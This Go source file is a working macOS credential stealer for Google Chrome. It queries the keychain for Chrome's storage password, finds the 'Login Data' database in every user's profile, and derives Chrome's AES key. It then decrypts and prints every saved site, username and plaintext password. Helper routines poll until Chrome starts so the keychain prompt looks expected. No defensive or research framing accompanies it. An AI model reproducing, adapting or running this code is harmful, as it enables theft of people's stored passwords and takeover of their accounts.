package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha1"
	"database/sql"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"regexp"
	"time"

	"github.com/fatih/color"
	_ "github.com/mattn/go-sqlite3"
	"golang.org/x/crypto/pbkdf2"
)

const TMP_DATABASE = "./dumps/tmp_database"

func main() {
	//macPromptEveryPeriod(5)
	//macPromptOnStart()
	//macExtractKeys()
}

func macCheckChromeOpen() bool {
	cmd := exec.Command("pgrep", "Google Chrome")
	var out bytes.Buffer
	cmd.Stdout = &out
	err := cmd.Run()
	if err != nil {
		color.Red("Chrome Not Running")
		return false
	}
	if len(out.String()) != 0 {
		color.Green("Chrome Running")
		return true
	}
	return false
}

func macPromptEveryPeriod(period int, maxTries int) int {
	var extracted int
	for i := 0; i < maxTries; i += 1 {
		extracted = macExtractKeys()
		if extracted != -1 {
			return extracted
		}
		time.Sleep(time.Duration(period) * time.Second)
	}
	return -1
}

func macPromptOnStart() int {
	var opened bool
	var extracted int
	prev := macCheckChromeOpen()
	for {
		opened = macCheckChromeOpen()
		if opened && !prev {
			extracted = macExtractKeys()
			if extracted != -1 {
				return extracted
			}
		}
		prev = opened
		time.Sleep(2 * time.Second)
	}
	return -1
}

func macExtractKeys() int {
	keychainPass := macKeychainPrompt()
	if keychainPass == "" {
		color.HiRed("Error: Keychain Password Not found")
		return -1
	}
	databases := macGetDatabases()
	if len(databases) == 0 {
		color.HiRed("Error: Login Data Not found")
		return -1
	}
	return macDecryptKeys(databases, keychainPass)
}

func macKeychainPrompt() string {
	// Prompt for Chrome keychain password
	cmd := exec.Command("security", "find-generic-password", "-ga", "Chrome")
	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out
	err := cmd.Run()
	if err != nil {
		return ""
	}
	re := regexp.MustCompile("password: \"(.*)\"")
	result := re.FindStringSubmatch(out.String())
	if result == nil || len(result) < 2 {
		color.Red("Keychain Password Not Found")
		return ""
	}
	color.Green("Keychain Password Found")
	return result[1]
}

func macDecryptKeys(dbPaths []string, keychain string) int {
	var url string
	var username string
	var passwHash string
	extracted := 0
	dk := pbkdf2.Key([]byte(keychain), []byte("saltysalt"), 1003, 16, sha1.New)
	password := make([]byte, 100)
	block, _ := aes.NewCipher([]byte(dk))
	for _, dbPath := range dbPaths {
		fmt.Println(dbPath)
		input, err := ioutil.ReadFile(dbPath)
		if err != nil {
			continue
		}
		err = ioutil.WriteFile(TMP_DATABASE, input, 0644)
		defer os.Remove(TMP_DATABASE)
		if err != nil {
			continue
		}
		database, err := sql.Open("sqlite3", TMP_DATABASE)
		if err != nil {
			continue
		}
		defer database.Close()
		rows, _ := database.Query("SELECT origin_url, username_value, password_value FROM logins")

		if err != nil {
			continue
		}
		for rows.Next() {
			rows.Scan(&url, &username, &passwHash)
			if len(passwHash) > 3 {
				for i, _ := range password {
					password[i] = '\x00'
				}
				iv := make([]byte, 16)
				for i, _ := range iv {
					iv[i] = ' '
				}
				passwHash = passwHash[3:]
				if len(passwHash)%aes.BlockSize != 0 {
					continue
				}
				mode := cipher.NewCBCDecrypter(block, iv)
				mode.CryptBlocks(password, []byte(passwHash))
				color.Blue("URL: %s", url)
				color.Red("\tUsername: %s", username)
				color.HiRed("\tPassword: %s", string(password))
				extracted += 1
			}
		}
	}
	return extracted
}

func macGetDatabases() []string {
	files, err := ioutil.ReadDir("/Users")
	var pathName string
	var databases []string
	if err != nil {
		fmt.Println("Lol")
		return nil
	}
	for _, f := range files {
		pathName = "/Users/" + f.Name() + "/Library/Application Support/Google/Chrome/Default/Login Data"
		if _, err := os.Stat(pathName); err == nil {
			databases = append(databases, pathName)
		}
	}
	return databases
}
